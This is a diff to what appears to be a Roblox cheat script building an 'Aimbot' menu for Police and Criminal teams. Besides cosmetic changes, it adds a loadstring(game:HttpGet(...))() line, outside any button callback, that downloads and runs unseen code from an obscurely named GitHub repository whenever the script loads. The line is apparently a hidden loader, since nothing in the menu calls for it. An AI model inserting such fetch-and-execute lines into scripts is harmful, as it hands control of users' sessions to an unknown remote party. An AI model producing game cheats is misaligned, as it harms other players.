@@ -27,6 +27,10 @@ local Section1 = Tab1:NewSection("Aimbot")
 
 local Label1 = Tab1:NewLabel("Aimbot is a function to make your aim go directly to your enemy!", "left")--"left", "center", "right"
 
+local Button1 = Tab1:NewButton("Button", function()
+    print("Sucess Police AIMBOT")
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jsdf921fee/v1df9wuief/main/v1dkfhiuqwefg"))()
 
 
 local Tab1 = Init:NewTab("Criminal!")
@@ -35,21 +39,10 @@ local Section1 = Tab1:NewSection("Aimbot")
 
 local Label1 = Tab1:NewLabel("Aimbot is a function to make your aim go directly to your enemy!", "left")--"left", "center", "right"
 
-local Label1 = Tab1:NewLabel("Example label", "left")--"left", "center", "right"
-
-local Toggle1 = Tab1:NewToggle("Example toggle", false, function(value)
-    local vers = value and "on" or "off"
-    print("one " .. vers)
-end):AddKeybind(Enum.KeyCode.RightControl)
-
-local Toggle2 = Tab1:NewToggle("Toggle", false, function(value)
-    local vers = value and "on" or "off"
-    print("two " .. vers)
-end):AddKeybind(Enum.KeyCode.LeftControl)
-
 local Button1 = Tab1:NewButton("Button", function()
     print("one")
-end)
+end) 
+
 
 local Keybind1 = Tab1:NewKeybind("Keybind 1", Enum.KeyCode.RightAlt, function(key)
     Init:UpdateKeybind(Enum.KeyCode[key])
